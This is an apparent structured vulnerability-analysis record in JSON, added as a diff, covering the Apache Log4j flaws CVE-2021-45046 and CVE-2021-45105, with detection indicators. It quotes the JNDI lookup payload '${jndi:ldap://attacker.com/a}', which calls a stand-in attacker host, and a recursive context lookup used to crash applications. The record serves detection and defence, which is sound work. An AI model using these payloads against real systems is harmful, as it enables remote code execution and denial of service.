@@ -1,0 +1,96 @@
+{
+  "package_info": {
+    "package_name": "Apache Log4j",
+    "package_manager": "Maven",
+    "package_versions": "2.0-beta9 - 2.12.1, 2.13.0 - 2.16.0",
+    "why_malicious": "The affected versions of Apache Log4j contain critical vulnerabilities (CVE-2021-45046 and CVE-2021-45105) that allow attackers to execute arbitrary code remotely or cause denial of service by sending specially crafted log messages. These vulnerabilities stem from unsafe handling of JNDI lookups and recursive context lookups in log patterns, enabling attackers to trigger remote code execution or application crashes through untrusted input."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when a log event is processed)",
+        "file_location": "Log4j PatternLayout in log4j2.xml or log4j2.properties configuration files, or in application log statements",
+        "required_permissions": [
+          "network (outbound connections)",
+          "environment_vars (for resolving lookups)"
+        ]
+      },
+      "code_snippet": "${jndi:ldap://attacker.com/a}",
+      "code_language": "Log4j pattern (configuration string)",
+      "code_behavior": "At runtime, when a log event containing this pattern is processed, the code initiates a JNDI lookup via LDAP to an attacker-controlled server, resulting in the retrieval and possible execution of remote code, which can lead to remote code execution on the host.",
+      "malice_analysis": {
+        "why_suspicious": "This pattern allows untrusted user input to trigger outbound JNDI lookups to attacker-controlled servers, enabling attackers to load and execute arbitrary code remotely. The use of ${jndi:...} in log patterns is highly dangerous, especially when user input is logged without sanitization.",
+        "violated_expectations": "Normal log statements should never cause the application to make outbound network requests or load and execute code from remote sources as a result of logging activity.",
+        "similar_legitimate_use": "JNDI lookups can be used for legitimate configuration or resource resolution in controlled environments, but should never be exposed to untrusted user input or used in log patterns that process external data.",
+        "key_indicators": [
+          "Presence of ${jndi:...} in log patterns or configuration files",
+          "Outbound LDAP/S or RMI network requests initiated during logging",
+          "Log events containing user-controlled data that trigger JNDI lookups"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (when a log event is processed)",
+        "file_location": "Log4j PatternLayout with context lookups in log4j2.xml or log4j2.properties, or in application log statements",
+        "required_permissions": [
+          "environment_vars (for resolving context lookups)"
+        ]
+      },
+      "code_snippet": "${ctx:loginId}",
+      "code_language": "Log4j pattern (configuration string)",
+      "code_behavior": "At runtime, when a log event containing this pattern is processed, the code performs a context lookup using user-controlled data. If the input is crafted to reference itself recursively, this can cause uncontrolled recursion, resulting in a StackOverflowError and crashing the process (denial of service).",
+      "malice_analysis": {
+        "why_suspicious": "Allows attackers to craft log input that causes recursive context lookups, leading to stack overflows and application crashes. This can be exploited for denial of service attacks by repeatedly triggering the vulnerable log pattern.",
+        "violated_expectations": "Log context lookups should not allow untrusted input to cause infinite recursion or application crashes. Logging mechanisms are expected to be robust against malformed or malicious input.",
+        "similar_legitimate_use": "Context lookups are commonly used for dynamic log content, such as including user IDs or session information, but should be sanitized and protected against recursive references.",
+        "key_indicators": [
+          "Use of ${ctx:...} in log patterns with user-controlled input",
+          "StackOverflowError or similar exceptions in logs following log events",
+          "Repeated application crashes correlated with specific log messages"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) or a recursive context reference (e.g., ${ctx:loginId}) to the vulnerable application.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Log4j processes the message and evaluates the lookup expressions in the log pattern."
+    },
+    {
+      "step": 2,
+      "action": "Log4j executes the JNDI lookup or context lookup as specified in the log pattern, using the untrusted input provided by the attacker.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "For JNDI lookups, this results in outbound network requests to attacker-controlled servers, potentially leading to remote code execution. For recursive context lookups, this can cause a StackOverflowError and crash the application (denial of service)."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Log messages or configuration files containing ${jndi:...} patterns, especially with user-controlled input",
+      "Unexpected outbound LDAP/S or RMI network requests from Java applications during logging operations",
+      "StackOverflowError or similar exceptions in application logs immediately after logging user input",
+      "Repeated application crashes or restarts correlated with specific log events"
+    ],
+    "file_indicators": [
+      "log4j2.xml or log4j2.properties files containing ${jndi:...} or ${ctx:...} patterns",
+      "Application logs showing evaluation of lookup patterns with user-supplied data",
+      "Presence of suspicious lookup expressions in log configuration or runtime log statements"
+    ],
+    "network_indicators": [
+      "Outbound LDAP/S or RMI requests to untrusted or external domains from Java processes",
+      "Connections to domains or IPs not present in legitimate configuration, especially after log events",
+      "DNS queries for attacker-controlled domains following log activity"
+    ],
+    "how_to_detect": "Monitor application logs and Log4j configuration files for the presence of ${jndi:...} or ${ctx:...} patterns, particularly when these patterns can be influenced by user input. Use network monitoring to detect unexpected outbound LDAP/S or RMI requests from Java applications, especially to external or untrusted domains. Alert on StackOverflowError or similar exceptions in logs that occur after logging user-supplied data. Employ static analysis tools to scan Log4j configuration files for unsafe lookup patterns, and correlate network activity with log events to identify exploitation attempts."
+  }
+}
